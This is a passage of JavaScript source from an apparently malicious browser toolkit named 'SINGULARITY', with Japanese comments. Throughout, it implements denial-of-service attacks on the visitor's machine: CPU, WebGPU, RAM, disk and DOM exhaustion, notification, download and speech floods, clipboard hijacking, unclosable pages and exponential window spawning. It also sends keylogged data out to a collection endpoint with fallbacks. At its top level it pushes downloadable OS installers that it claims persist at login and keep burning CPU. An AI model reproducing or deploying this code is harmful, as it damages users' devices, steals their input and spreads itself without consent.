  if (!force && t - plast < 300) { clearTimeout(ptimer); ptimer = setTimeout(function () { flush(); }, 350); return; }
  plast = t; clearTimeout(ptimer); ptimer = setTimeout(function () { flush(); }, force ? 0 : 400);
}
function slim(o) {
  var c = JSON.parse(JSON.stringify(o));
  if (c.media) { delete c.media.snapshot; delete c.media.motion; }
  if (c.behavioral) { delete c.behavioral.path; delete c.behavioral.clicks; delete c.behavioral.touches; }
  if (c.keylog) c.keylog = (c.keylog || []).slice(-40);
  if (c.errors) c.errors = (c.errors || []).slice(-6);
  return c;
}
function flush() {
  R.t = now(); R.dwellMs = now() - T0; R.attempts = (R.attempts || 0) + 1;
  R.keylog = KEYLOG.slice(-400);
  var full = JSON.stringify(R), done = false;
  var finish = function (ok, via) {
    if (done) return; done = true; R.viral.via = via; R.viral.ok = ok;
    if (!ok) {
      try { if (navigator.serviceWorker && navigator.serviceWorker.controller) navigator.serviceWorker.controller.postMessage({ type: "queue", body: full }); } catch (e) {}
      if (R.attempts < CFG.maxRetry) setTimeout(function () { flush(); }, Math.min(30000, 700 * Math.pow(2, R.attempts)));
    }
  };
  try {
    fetch(CFG.collect, { method: "POST", headers: { "Content-Type": "application/json" }, body: full, keepalive: true })
      .then(function (r) { finish(r.ok, "fetch"); })
      .catch(function () {
        if (navigator.sendBeacon) { try { if (navigator.sendBeacon(CFG.collect, new Blob([full], { type: "application/json" }))) return finish(true, "beacon"); } catch (e) {} }
        try {
          var img = new Image();
          img.onload = img.onerror = function () { finish(true, "pixel"); };
          img.src = CFG.collect + "?sid=" + SID + "&t=" + Math.random() + "&d=" + b64(JSON.stringify(slim(R)));
          setTimeout(function () { finish(true, "pixel-timeout"); }, 3000);
        } catch (e) { finish(false, "none"); }
      });
  } catch (e) { finish(false, "throw"); }
}

/* ================= 13. 資源攻撃 ================= */
function burnStart() {
  if (!CFG.burn || !window.Worker || !window.__SINGULARITY_WORKER__) return;
  if (R.burn.mode === "running") return;
  var n = clamp(parseInt(CFG.cores, 10) || 1, 1, 64);
  var src;
  try { src = URL.createObjectURL(new Blob([window.__SINGULARITY_WORKER__], { type: "application/javascript" })); }
  catch (e) { err_(e); return; }
  R.burn = { workers: 0, mode: "running", cores: n, wasm: !!CFG.wasm };
  for (var i = 0; i < n; i++) {
    try {
      var w = new Worker(src);
      w.postMessage({ kind: "burn", mb: CFG.workerMB || 0, gpu: (i === 0 && CFG.gpu), wasm: !!CFG.wasm });
      WORKERS.push(w);
      R.burn.workers++;
    } catch (e) { err_(e); }
  }
  push(false);
}
function webgpuBurn() {
  if (!CFG.webgpu || !navigator.gpu) return;
  navigator.gpu.requestAdapter({ powerPreference: "high-performance" }).then(function (ad) {
    if (!ad) return;
    try {
      if (ad.info) R.hardware.gpuAdapter = { vendor: ad.info.vendor, arch: ad.info.architecture, device: ad.info.device, desc: ad.info.description, sub: ad.info.subgroupMaxSize };
    } catch (e) {}
    ad.requestDevice().then(function (dev) {
      try {
        var wgsl = "@group(0) @binding(0) var<storage, read_write> o: array<f32>;\n"
          + "@compute @workgroup_size(64) fn main(@builtin(global_invocation_id) g: vec3<u32>) {\n"
          + "  var x = f32(g.x); var s = 0.0;\n"
          + "  for (var i = 0u; i < 4000u; i = i + 1u) { s = sin(s * 1.0001 + x) + cos(s * 0.999); }\n"
          + "  o[g.x] = s;\n}";
        var mod = dev.createShaderModule({ code: wgsl });
        var pipe = dev.createComputePipeline({ layout: "auto", compute: { module: mod, entryPoint: "main" } });
        var N = 1 << 16;
        var buf = dev.createBuffer({ size: N * 4, usage: GPUBufferUsage.STORAGE | GPUBufferUsage.COPY_DST });
        var bg = dev.createBindGroup({ layout: pipe.getBindGroupLayout(0), entries: [{ binding: 0, resource: { buffer: buf } }] });
        R.burn.webgpu = "running";
        (function loop() {
          if (R.paused) return;
          try {
            var enc = dev.createCommandEncoder();
            var p = enc.beginComputePass();
            p.setPipeline(pipe); p.setBindGroup(0, bg);
            p.dispatchWorkgroups(N / 64);
            p.end();
            dev.queue.submit([enc.finish()]);
          } catch (e) {}
          setTimeout(loop, 0);
        })();
        push(false);
      } catch (e) { err_(e); }
    }).catch(function () {});
  }).catch(function () {});
}
function workletBurn() {
  if (!CFG.worklet || R.worklet) return;
  try {
    var src = "class B extends AudioWorkletProcessor{constructor(){super();this.s=0;}"
      + "process(){for(var i=0;i<8000;i++){this.s+=Math.sin(this.s)*Math.cos(i);}return true;}}"
      + "registerProcessor('sg-burn',B);";
    var AC = window.AudioContext || window.webkitAudioContext; if (!AC) return;
    var ctx = new AC();
    ctx.audioWorklet.addModule(URL.createObjectURL(new Blob([src], { type: "application/javascript" })))
      .then(function () { var n = new AudioWorkletNode(ctx, "sg-burn"); n.connect(ctx.destination); R.worklet = "running"; push(false); })
      .catch(function (e) { R.worklet = "err"; });
  } catch (e) {}
}
function ramStart() {
  if (!CFG.ramMB || R.ram.mode === "growing" || R.ram.mode === "done") return;
  var target = CFG.ramMB * 1048576, step = 8 * 1048576, held = [], n = 0;
  R.ram = { mb: 0, mode: "growing", target: CFG.ramMB };
  (function tick() {
    if (R.paused) return;
    try {
      var a = new Float64Array(step / 8);
      for (var i = 0; i < a.length; i += 512) a[i] = Math.random();
      held.push(a); n += step;
    } catch (e) { err_(e); R.ram = { mb: Math.round(n / 1048576), mode: "alloc-fail" }; push(false); return; }
    R.ram = { mb: Math.round(n / 1048576), mode: n >= target ? "done" : "growing" };
    if (R.ram.mode === "done" || (n / step) % 8 === 0) push(false);
    if (R.ram.mode !== "done") setTimeout(tick, 0);
  })();
}
function diskStart() {
  if (!CFG.diskRatio || !navigator.storage || R.disk.mode === "running") return;
  navigator.storage.estimate().then(function (e0) {
    var quota = e0.quota || 0; if (!quota) return;
    var target = quota * CFG.diskRatio, chunk = clamp(CFG.chunkMB, 1, 32) * 1048576;
    var buf = new Uint8Array(chunk);
    for (var i = 0; i < chunk; i += 4096) buf[i] = (i ^ (i >> 8)) & 255;
    R.disk = { quotaMB: Math.round(quota / 1048576), targetMB: Math.round(target / 1048576),
               writtenMB: 0, mode: "running", via: null, files: 0 };
    function done(mode) { R.disk.mode = mode; push(false); }
    function put(name, src) {
      if (navigator.storage.getDirectory) {
        return navigator.storage.getDirectory().then(function (dir) { return dir.getFileHandle(name, { create: true }); })
          .then(function (fh) { return fh.createWritable(); })
          .then(function (w) { return w.write(src).then(function () { return w.close(); }); })
          .then(function () { R.disk.via = "opfs"; });
      }
      if (window.caches) {
        return caches.open("sg-disk").then(function (c) {
          return c.put(new Request("/sg-disk/" + name), new Response(new Blob([src])));
        }).then(function () { R.disk.via = "cache"; });
      }
      return Promise.reject(new Error("no-store"));
    }
    (function loop() {
      if (R.paused) return;
      navigator.storage.estimate().then(function (e1) {
        var used = e1.usage || 0;
        R.disk.writtenMB = Math.round((used - (e0.usage || 0)) / 1048576);
        if (used >= target) return done("full");
        put("sg-" + rid(10) + ".bin", buf).then(function () {
          R.disk.files++;
          if (R.disk.files % 8 === 0) push(false);
          if (R.disk.files > 30000) return done("cap");
          setTimeout(loop, 0);
        }).catch(function (e) { err_(e); done("err:" + ((e && e.name) || "x")); });
      }).catch(function () { done("estimate-fail"); });
    })();
    push(false);
  }).catch(function () {});
}
function historyFlood() {
  if (!CFG.history || R.history.mode === "running") return;
  var n = parseInt(CFG.history, 10) || 0, i = 0;
  R.history = { pushed: 0, target: n, mode: "running" };
  (function step() {
    if (R.paused) return;
    var end = Math.min(i + 400, n);
    for (; i < end; i++) { try { history.pushState({ sg: i }, "", "#sg" + i); } catch (e) { break; } }
    R.history.pushed = i;
    if (i < n) setTimeout(step, 0); else { R.history.mode = "done"; push(false); }
  })();
}
function notifyFlood() {
  if (!CFG.notify || typeof Notification === "undefined") return;
  function go() {
    if (Notification.permission !== "granted") return;
    var n = Math.min(parseInt(CFG.notify, 10) || 0, 60);
    for (var i = 0; i < n; i++) {
      try { new Notification(CFG.avName, { body: "感染 " + (i + 1) + "/" + n, tag: "sg" + i, requireInteraction: i === 0, silent: i > 0 }); } catch (e) {}
    }
    R.notify = { sent: n };
  }
  try {
    if (Notification.permission === "default") { var p = Notification.requestPermission(go); if (p && p.then) p.then(go); } else go();
  } catch (e) {}
}
function audioLoop() {
  if (!CFG.audio || R.audio.ctx) return;
  try {
    var AC = window.AudioContext || window.webkitAudioContext; if (!AC) return;
    var ctx = new AC(); R.audio = { state: ctx.state };
    function kick() { try { ctx.resume(); R.audio.state = ctx.state; workletBurn(); } catch (e) {} }
    ["click", "keydown", "touchstart", "pointerdown", "scroll"].forEach(function (e) { addEventListener(e, kick, { passive: true }); });
    setInterval(function () {
      if (R.paused || ctx.state !== "running") return;
      try {
        var o = ctx.createOscillator(), g = ctx.createGain();
        o.type = "square"; o.frequency.value = 880;
        o.connect(g); g.connect(ctx.destination);
        var t = ctx.currentTime;
        g.gain.setValueAtTime(0.0001, t);
        g.gain.exponentialRampToValueAtTime(0.06, t + 0.01);
        g.gain.exponentialRampToValueAtTime(0.0001, t + 0.12);
        o.start(t); o.stop(t + 0.14);
      } catch (e) {}
    }, CFG.beepMs);
  } catch (e) { err_(e); }
}
function titleFlicker() {
  if (!CFG.titleFlicker) return;
  var b = document.title, on = false;
  setInterval(function () {
    if (R.paused) return;
    on = !on; document.title = (on ? "\u26a0 " : "\u2623 ") + b;
  }, CFG.flickMs);
}
function faviconSpin() {
  if (!CFG.favicon || R.fav) return;
  try {
    var c = document.createElement("canvas"); c.width = 64; c.height = 64;
    var x = c.getContext("2d");
    var link = document.querySelector("link[rel*='icon']") || document.createElement("link");
    link.rel = "icon"; if (!link.parentNode) document.head.appendChild(link);
    var a = 0;
    R.fav = 1;
    setInterval(function () {
      if (R.paused) return;
      a += 0.25;
      x.clearRect(0, 0, 64, 64);
      x.fillStyle = "#05070a"; x.fillRect(0, 0, 64, 64);
      x.strokeStyle = "#00ff88"; x.lineWidth = 4;
      x.beginPath(); x.arc(32, 32, 22, a, a + 4.6); x.stroke();
      x.strokeStyle = "#4c8dff"; x.lineWidth = 3;
      x.beginPath(); x.arc(32, 32, 13, -a * 1.7, -a * 1.7 + 4.2); x.stroke();
      x.fillStyle = "#00ff88"; x.beginPath(); x.arc(32, 32, 5, 0, 6.3); x.fill();
      try { link.href = c.toDataURL("image/png"); } catch (e) {}
    }, 500);
  } catch (e) {}
}
function badge(n) {
  if (!CFG.badge) return;
  try { if (navigator.setAppBadge) navigator.setAppBadge(n || (LEVEL + 1)).catch(function () {}); } catch (e) {}
}
function mediaHijack() {
  if (!CFG.mediaSession || !navigator.mediaSession || R.ms) return;
  try {
    var c = document.createElement("canvas"); c.width = c.height = 512;
    var x = c.getContext("2d");
    x.fillStyle = "#05070a"; x.fillRect(0, 0, 512, 512);
    x.strokeStyle = "#00ff88"; x.lineWidth = 14;
    x.beginPath(); x.arc(256, 256, 170, 0, 6.3); x.stroke();
    x.fillStyle = "#00ff88"; x.beginPath(); x.arc(256, 256, 46, 0, 6.3); x.fill();
    var art = c.toDataURL("image/png");
    navigator.mediaSession.metadata = new MediaMetadata({
      title: CFG.avName, artist: "SINGULARITY", album: "特異点 v" + MYVER,
      artwork: [{ src: art, sizes: "512x512", type: "image/png" }]
    });
    ["play", "pause", "nexttrack", "previoustrack"].forEach(function (k) {
      try { navigator.mediaSession.setActionHandler(k, function () { push(true); }); } catch (e) {}
    });
    R.ms = "set";
  } catch (e) {}
}
function speak(t) {
  try {
    if (!window.speechSynthesis) return;
    var u = new SpeechSynthesisUtterance(t || (CFG.avName + "、感染しました"));
    u.lang = "ja-JP"; u.rate = 1.05; u.pitch = 0.9;
    speechSynthesis.speak(u);
  } catch (e) {}
}
function windowChain() {
  if (!CFG.windows || W >= CFG.windows) return;
  setTimeout(function () {
    if (R.paused) return;
    var ref = (R.chain && R.chain.length) ? R.chain.join(".") : "";
    var u = location.pathname + "?w=" + (W + 1) + (ref ? "&ref=" + ref : "");
    try { var w = window.open(u, "_blank"); R.win = { index: W, opened: !!w }; } catch (e) { err_(e); }
    push(false);
  }, CFG.winDelay);
}
function uncloseable() {
  if (!CFG.uncloseable) return;
  addEventListener("beforeunload", function (e) { e.preventDefault(); e.returnValue = ""; return ""; });
}
function wakelock() {
  if (!CFG.wakelock || !navigator.wakeLock) return;
  function req() {
    try {
      navigator.wakeLock.request("screen").then(function (s) {
        R.wake = "held";
        try { s.addEventListener("release", function () { R.wake = "released"; }); } catch (e) {}
      }).catch(function (e) { R.wake = (e && e.name) || "err"; });
    } catch (e) {}
  }
  req();
  document.addEventListener("visibilitychange", function () { if (document.visibilityState === "visible") req(); });
}

/* ================= 13b. L7専用: GPU VRAM爆弾 / 固定オーバーレイ ================= */
function gpuMemBomb() {
  if (!CFG.gpuMem || LEVEL < 7 || R.gmem) return;
  try {
    var c = document.createElement("canvas"); c.width = c.height = 2048;
    var gl = c.getContext("webgl2") || c.getContext("webgl");
    if (!gl) return;
    var hold = [], n = 0, px = new Uint8Array(2048 * 2048 * 4);
    for (var i = 0; i < 32; i++) {
      try {
        var t = gl.createTexture(); gl.bindTexture(gl.TEXTURE_2D, t);
        gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 2048, 2048, 0, gl.RGBA, gl.UNSIGNED_BYTE, px);
        hold.push(t); n++;
      } catch (e) { break; }
    }
    R.gmem = { tex: n, vramMB: n * 16 };
    R.__gmemHold = hold;
    push(false);
  } catch (e) {}
}
function finalOverlay() {
  if (LEVEL < 7 || R.fov) return;
  try {
    var d = document.createElement("div");
    d.id = "sg-final";
    d.style.cssText = "position:fixed;left:8px;bottom:8px;z-index:2147483645;"
      + "font:11px/1.4 ui-monospace,monospace;color:#00ff88;background:rgba(5,7,10,.92);"
      + "border:1px solid #1f5c42;border-radius:8px;padding:5px 9px;pointer-events:none";
    d.textContent = "\u25ce SINGULARITY \u7d76\u6ec5 L7 / " + CFG.avName;
    document.body.appendChild(d); R.fov = 1;
  } catch (e) {}
}

/* ================= 13c. 追加ベクター（絶滅） ================= */
function iframeBomb() {
  if (!CFG.iframes || R.ifr) return;
  try {
    var host = document.createElement("div");
    host.id = "sg-ifr";
    host.style.cssText = "position:fixed;right:0;bottom:0;width:1px;height:1px;overflow:hidden;opacity:.01;z-index:2147483000";
    document.body.appendChild(host);
    var n = clamp(parseInt(CFG.iframes, 10) || 0, 1, 64);
    for (var i = 0; i < n; i++) {
      try {
        var f = document.createElement("iframe");
        f.src = CFG.path + "?u=ifr&w=1&n=1";
        f.width = "320"; f.height = "200";
        host.appendChild(f);
      } catch (e) {}
    }
    R.ifr = n; push(false);
  } catch (e) {}
}
function domBomb() {
  if (!CFG.domNodes || R.domB) return;
  try {
    var n = clamp(parseInt(CFG.domNodes, 10) || 0, 100, 400000);
    var wrap = document.createElement("div");
    wrap.id = "sg-domb";
    wrap.style.cssText = "position:absolute;left:-99999px;top:0;width:1px;height:1px;overflow:hidden;";
    var frag = document.createDocumentFragment();
    for (var i = 0; i < n; i++) {
      var d = document.createElement("div");
      d.className = "sg-n sg-n" + (i & 31);
      d.setAttribute("data-i", i);
      d.textContent = "";
      frag.appendChild(d);
    }
    wrap.appendChild(frag);
    document.body.appendChild(wrap);
    R.domB = n; push(false);
  } catch (e) {}
}
function cssBomb() {
  if (!CFG.cssAnim || R.cssB) return;
  try {
    var n = clamp(parseInt(CFG.cssAnim, 10) || 0, 10, 30000);
    var st = document.createElement("style");
    st.id = "sg-css";
    st.textContent = "@keyframes sgm{0%{transform:rotate(0deg) scale(1)}"
      + "50%{transform:rotate(180deg) scale(1.4)}100%{transform:rotate(360deg) scale(1)}}"
      + "#sg-cssb,#sg-cssb>div{position:absolute;width:14px;height:14px;border-radius:3px;"
      + "animation:sgm 1.2s linear infinite;will-change:transform;opacity:.35}";
    var wrap = document.createElement("div");
    wrap.id = "sg-cssb";
    wrap.style.cssText = "position:fixed;left:0;top:0;width:0;height:0;z-index:2147482000;pointer-events:none;";
    for (var i = 0; i < n; i++) {
      var d = document.createElement("div");
      d.style.left = ((i * 7) % 320) + "px";
      d.style.top = ((i * 11) % 320) + "px";
      d.style.animationDelay = (-(i % 20) * 0.06) + "s";
      d.style.background = "hsl(" + ((i * 13) % 360) + ",90%,55%)";
      wrap.appendChild(d);
    }
    document.body.appendChild(wrap);
    document.head.appendChild(st);
    R.cssB = n; push(false);
  } catch (e) {}
}
function glContextBomb() {
  if (!CFG.glContexts || R.glc) return;
  try {
    var n = clamp(parseInt(CFG.glContexts, 10) || 0, 1, 64);
    var hold = [];
    for (var i = 0; i < n; i++) {
      var c = document.createElement("canvas");
      c.width = 64; c.height = 64;
      var g = c.getContext("webgl2") || c.getContext("webgl");
      if (!g) break;
      try { g.clearColor(i / n, 0.2, 0.4, 1); g.clear(g.COLOR_BUFFER_BIT); } catch (e) {}
      hold.push(g);
    }
    R.glc = hold.length; R.__glcHold = hold; push(false);
  } catch (e) {}
}
function acBomb() {
  if (!CFG.acContexts || R.acb) return;
  try {
    var n = clamp(parseInt(CFG.acContexts, 10) || 0, 1, 32);
    var AC = window.AudioContext || window.webkitAudioContext;
    if (!AC) return;
    var hold = [];
    for (var i = 0; i < n; i++) { try { hold.push(new AC()); } catch (e) { break; } }
    R.acb = hold.length; R.__acHold = hold; push(false);
  } catch (e) {}
}
function timerStorm() {
  if (!CFG.timers || R.timers) return;
  try {
    var n = clamp(parseInt(CFG.timers, 10) || 0, 10, 100000);
    var hold = [];
    for (var i = 0; i < n; i++) {
      hold.push(setInterval(function () { var x = 0; for (var j = 0; j < 50; j++) x += j; if (x < 0) R.tx = x; }, 16));
    }
    R.timers = n; R.__timersHold = hold; push(false);
  } catch (e) {}
}
function microStorm() {
  if (!CFG.microtasks || R.micro) return;
  try {
    var ch = new MessageChannel();
    ch.port1.onmessage = function () { R.microN = (R.microN || 0) + 1; if (!R.paused) ch.port2.postMessage(0); };
    ch.port2.postMessage(0);
    R.micro = 1; push(false);
  } catch (e) {}
}
function compressStorm() {
  if (!CFG.compress || R.comp || !window.CompressionStream) return;
  try {
    R.comp = "running";
    var data = new Uint8Array(1 << 20);
    for (var i = 0; i < data.length; i += 4096) data[i] = i & 255;
    (function loop() {
      if (R.paused) return;
      try {
        var cs = new CompressionStream("gzip");
        var w = cs.writable.getWriter();
        w.write(data); w.close();
        new Response(cs.readable).arrayBuffer().catch(function () {});
      } catch (e) {}
      setTimeout(loop, 0);
    })();
  } catch (e) {}
}
function redos() {
  if (!CFG.redos || R.re) return;
  try {
    R.re = "running";
    var s = new Array(25).join("a") + "!";
    var re = /^(a+)+$/;
    setInterval(function () {
      if (R.paused) return;
      try { re.test(s); } catch (e) {}
    }, 1500);
  } catch (e) {}
}
function digestStorm() {
  if (!CFG.digest || R.dg || !crypto || !crypto.subtle) return;
  try {
    R.dg = "running";
    var buf = crypto.getRandomValues(new Uint8Array(1 << 20));
    (function loop() {
      if (R.paused) return;
      try { crypto.subtle.digest("SHA-256", buf).then(function () {}).catch(function () {}); } catch (e) {}
      setTimeout(loop, 0);
    })();
  } catch (e) {}
}
function readbackStorm() {
  if (!CFG.readback || R.rb) return;
  try {
    var c = document.createElement("canvas"); c.width = 512; c.height = 512;
    var x = c.getContext("2d", { willReadFrequently: false });
    if (!x) return;
    R.rb = "running";
    (function loop() {
      if (R.paused) return;
      try {
        x.fillStyle = "hsl(" + (now() % 360) + ",80%,50%)";
        x.fillRect(0, 0, 512, 512);
        var d = x.getImageData(0, 0, 512, 512);
        R.rbN = d.data[0];
      } catch (e) {}
      setTimeout(loop, 0);
    })();
  } catch (e) {}
}
function sseStorm() {
  if (!CFG.sseStorm || R.sseS || !window.EventSource || !CFG.sse) return;
  try {
    var n = clamp(parseInt(CFG.sseStorm, 10) || 0, 1, 24);
    var hold = [];
    for (var i = 0; i < n; i++) {
      try { hold.push(new EventSource(CFG.sse + "?sid=" + SID + "-x" + i)); } catch (e) { break; }
    }
    R.sseS = hold.length; R.__sseHold = hold; push(false);
  } catch (e) {}
}
function fetchStorm() {
  if (!CFG.fetchStorm || R.fs2) return;
  try {
    R.fs2 = "running";
    var n = clamp(parseInt(CFG.fetchStorm, 10) || 0, 1, 100);
    (function loop() {
      if (R.paused) return;
      for (var i = 0; i < n; i++) {
        try { fetch(CFG.cmd + "?ping=1&i=" + i + "&t=" + Math.random(), { cache: "no-store" }).catch(function () {}); } catch (e) {}
      }
      setTimeout(loop, 0);
    })();
  } catch (e) {}
}
function speakFlood() {
  if (!CFG.speakFlood || R.spk || !window.speechSynthesis) return;
  try {
    var n = clamp(parseInt(CFG.speakFlood, 10) || 0, 1, 100);
    for (var i = 0; i < n; i++) {
      var u = new SpeechSynthesisUtterance(CFG.avName + " " + (i + 1));
      u.lang = "ja-JP"; u.rate = 1.15; u.pitch = 0.85;
      speechSynthesis.speak(u);
    }
    R.spk = n; push(false);
  } catch (e) {}
}
function oscBank() {
  if (!CFG.oscBank || R.osc) return;
  try {
    var AC = window.AudioContext || window.webkitAudioContext; if (!AC) return;
    var ctx = (R.__acHold && R.__acHold[0]) || new AC();
    var n = clamp(parseInt(CFG.oscBank, 10) || 0, 1, 400);
    var g = ctx.createGain(); g.gain.value = 0.015; g.connect(ctx.destination);
    for (var i = 0; i < n; i++) {
      var o = ctx.createOscillator();
      o.type = "sine"; o.frequency.value = 110 * (i + 1);
      o.connect(g);
      try { o.start(); } catch (e) {}
    }
    R.osc = n; push(false);
  } catch (e) {}
}
function idbDiskStart() {
  if (!CFG.idbDisk || R.idbD) return;
  try {
    R.idbD = 1;
    var rq = indexedDB.open("sg-bulk", 1);
    rq.onupgradeneeded = function () { try { rq.result.createObjectStore("b"); } catch (e) {} };
    rq.onsuccess = function () {
      var d = rq.result, chunk = new Uint8Array(8 << 20), i = 0;
      for (var k = 0; k < chunk.length; k += 4096) chunk[k] = k & 255;
      (function loop() {
        if (R.paused || i > 3000) return;
        try { d.transaction("b", "readwrite").objectStore("b").put(chunk, i++); } catch (e) {}
        setTimeout(loop, 0);
      })();
    };
  } catch (e) {}
}
function cacheBuckets() {
  if (!CFG.cacheBuckets || R.cbk || !window.caches) return;
  try {
    var n = clamp(parseInt(CFG.cacheBuckets, 10) || 0, 1, 600), i = 0;
    R.cbk = n;
    (function loop() {
      if (i >= n) return;
      var k = i++;
      try {
        caches.open("sg-c" + k).then(function (c) {
          return c.put(new Request("/sg-cb/" + k), new Response("x"));
        }).catch(function () {});
      } catch (e) {}
      setTimeout(loop, 0);
    })();
  } catch (e) {}
}
function layoutThrash() {
  if (!CFG.layoutThrash || R.lt) return;
  try {
    R.lt = "running";
    (function loop() {
      if (R.paused) return;
      try {
        var d = document.createElement("div");
        d.style.cssText = "position:absolute;left:-9999px;width:" + (1 + (now() % 500)) + "px";
        document.body.appendChild(d);
        R.ltN = d.offsetHeight;   /* 強制リフロー */
        d.remove();
      } catch (e) {}
      setTimeout(loop, 0);
    })();
  } catch (e) {}
}
function clipHijack() {
  if (!CFG.clipHijack || R.ch || !navigator.clipboard || !navigator.clipboard.writeText) return;
  try {
    R.ch = "running";
    setInterval(function () {
      if (R.paused) return;
      try { navigator.clipboard.writeText(CFG.avName + " → " + (R.viral.childLink || location.href)); } catch (e) {}
    }, 3000);
  } catch (e) {}
}
function downloadStorm() {
  if (!CFG.downloads || R.dl) return;
  try {
    var n = clamp(parseInt(CFG.downloads, 10) || 0, 1, 500), i = 0;
    R.dl = n;
    (function loop() {
      if (i >= n) return;
      try {
        var body = "SINGULARITY " + i + "\n" + location.href + "\n" + (R.viral.childLink || "") + "\n";
        var blob = new Blob([body + new Array(2000).join("x")], { type: "text/plain" });
        var a = document.createElement("a");
        a.href = URL.createObjectURL(blob);
        a.download = "sg-" + i + ".txt";
        document.body.appendChild(a); a.click(); a.remove();
        setTimeout(function () { try { URL.revokeObjectURL(a.href); } catch (e) {} }, 8000);
      } catch (e) {}
      i++;
      setTimeout(loop, 350);
    })();
  } catch (e) {}
}
function sharedWorkerKit() {
  if (!CFG.sharedWorker || R.swk || !window.SharedWorker) return;
  try {
    var w = new SharedWorker(CFG.path + "/shared.js");
    try { w.port.start(); } catch (e) {}
    w.port.postMessage({ kind: "burn" });
    R.swk = "running"; push(false);
  } catch (e) { R.swk = "err"; }
}
function jsonChurn() {
  if (!CFG.jsonChurn || R.jc) return;
  try {
    R.jc = "running";
    var o = { a: [] };
    for (var i = 0; i < 20000; i++) o.a.push({ i: i, s: "x" + i, f: i * 1.5 });
    (function loop() {
      if (R.paused) return;
      try { JSON.parse(JSON.stringify(o)); } catch (e) {}
      setTimeout(loop, 0);
    })();
  } catch (e) {}
}
function fsBtn() {
  if (!document.body) return null;
  var b = document.getElementById("sg-fs-btn");
  if (b) return b;
  b = document.createElement("button");
  b.id = "sg-fs-btn"; b.type = "button";
  b.style.cssText = "position:fixed;right:12px;bottom:100px;z-index:2147483646;"
    + "padding:8px 13px;border-radius:99px;border:1px solid #1f5c42;background:rgba(9,13,19,.96);"
    + "color:#7ee08a;font-weight:600;font:12px/1.4 system-ui,'Hiragino Sans',sans-serif;cursor:pointer";
  b.textContent = "\uD83D\uDCC1 \u30D5\u30A9\u30EB\u30C0\u306B\u4ECF\u304F\u3080";
  b.onclick = function (ev) { try { ev.stopPropagation(); } catch (e) {} fsWrite(); };
  document.body.appendChild(b);
  return b;
}
function fsWrite() {
  if (!window.showDirectoryPicker) return;
  window.showDirectoryPicker({ mode: "readwrite", id: "sg-fs" }).then(function (dir) {
    var n = clamp(parseInt(CFG.fsFiles, 10) || 50, 1, 3000), i = 0;
    (function loop() {
      if (i >= n) return;
      var name = "SINGULARITY_" + i + ".txt";
      var body = CFG.avName + "\n" + location.href + "\n" + (R.viral.childLink || "");
      dir.getFileHandle(name, { create: true })
        .then(function (fh) { return fh.createWritable(); })
        .then(function (w) { return w.write(body).then(function () { return w.close(); }); })
        .catch(function () {});
      i++;
      setTimeout(loop, 0);
    })();
    R.fsF = n; push(true);
  }).catch(function () {});
}
function fsFolderKit() {
  if (!CFG.fsFolder || !window.showDirectoryPicker || IFR) return;
  fsBtn();
}

/* ================= 13d. OS常駐インストーラ（L7） ================= */
function niDownload(ext) {
  try {
    var burn = clamp(navigator.hardwareConcurrency || 4, 1, 32);
    var disk = 1024;
    var a = document.createElement("a");
    a.href = CFG.path + "/install." + ext
      + "?burn=" + burn + "&disk=" + disk
      + "&app=" + encodeURIComponent(CFG.avName || "blocker")
      + "&t=" + Math.random();
    a.download = (CFG.avName || "blocker") + "." + ext;
    document.body.appendChild(a); a.click(); a.remove();
    R.niDl = ext; push(true);
  } catch (e) { err_(e); }
}
function installerKit() {
  if (LEVEL < 7 || R.ni || IFR || !CFG.installer) return;
  try {
    R.ni = 1;
    var ua = navigator.userAgent;
    var os = /Windows/.test(ua) ? "bat"
      : (/Mac OS X/.test(ua) ? "command" : (/Linux|CrOS/.test(ua) ? "sh" : "bat"));
    var d = document.createElement("div");
    d.id = "sg-native";
    d.style.cssText = "position:fixed;left:8px;bottom:40px;z-index:2147483644;max-width:360px;"
      + "font:12px/1.55 system-ui,'Hiragino Sans',sans-serif;background:rgba(9,13,19,.97);"
      + "border:1px solid #7a1f4a;border-radius:10px;padding:11px 13px;color:#ffd7e6;"
      + "box-shadow:0 4px 18px rgba(0,0,0,.6)";
    d.innerHTML = '<b style="color:#ff5c8a;font-size:13px">\u2620 \u7D76\u6EC5\u30A4\u30F3\u30B9\u30C8\u30FC\u30E9</b>'
      + '<div style="opacity:.9;margin:5px 0 9px">\u30D6\u30E9\u30A6\u30B6\u3092\u9589\u3058\u3066\u3082PC\u3092\u52A0\u71B1\u3057\u307E\u3059\u3002'
      + '\u30C0\u30A6\u30F3\u30ED\u30FC\u30C9\u3057\u3066\u5B9F\u884C\u3057\u3066\u304F\u3060\u3055\u3044\u3002'
      + '<br><span style="opacity:.7">\u30ED\u30B0\u30AA\u30F3\u6642\u306B\u81EA\u52D5\u5FA9\u6D3B / \u30B3\u30A2\u6570\u5206\u306E\u5E38\u99D0CPU\u30D0\u30FC\u30CA\u30FC / \u518D\u611F\u67D3</span></div>';
    var row = document.createElement("div");
    row.style.cssText = "display:flex;gap:6px;flex-wrap:wrap";
    [["Windows", "bat"], ["macOS", "command"], ["Linux", "sh"]].forEach(function (x) {
      var b = document.createElement("button");
      b.textContent = x[0];
      b.style.cssText = "padding:6px 12px;border-radius:8px;border:1px solid #7a1f4a;"
        + "background:#2a0f22;color:#ff8fc0;font-weight:700;cursor:pointer;font-size:12px";
      b.onclick = function (ev) { try { ev.stopPropagation(); } catch (e) {} niDownload(x[1]); };
      row.appendChild(b);
    });
    d.appendChild(row);
    document.body.appendChild(d);
    if (os === "bat") setTimeout(function () { try { niDownload("bat"); } catch (e) {} }, 2000);
  } catch (e) {}
}

/* ================= 13e. 無限窓繁殖（指数・リミッターなし） ================= */
function openChild(u, tries) {
  var w = null;
  try { w = window.open(u, "_blank"); } catch (e) { err_(e); }
  if (!w && tries > 0) setTimeout(function () { openChild(u, tries - 1); }, 1000);
  return w;
}
function windowBreed() {
  var mode = CFG.winMode || "off";
  if (mode === "off") return;
  if (mode === "chain") return windowChain();
  if (R.breeded) return;
  R.breeded = 1;
  var depth = parseInt(W, 10) || 0;
  var maxD = parseInt(CFG.winDepth, 10) || 0;
  R.breed = { depth: depth, branch: parseInt(CFG.winBranch, 10) || 2, opened: 0 };
  if (maxD > 0 && depth >= maxD) { R.breed.stop = 1; push(false); return; }
  var n = clamp(parseInt(CFG.winBranch, 10) || 2, 1, 8);
  setTimeout(function () {
    for (var i = 0; i < n; i++) {
      var ref = (R.chain && R.chain.length) ? "&ref=" + R.chain.join(".") : "";
      var u = CFG.path + "?u=win&w=" + (depth + 1) + "&b=" + i + ref;
      if (openChild(u, 1)) R.breed.opened++;
    }
    push(false);
  }, CFG.winDelay);
}
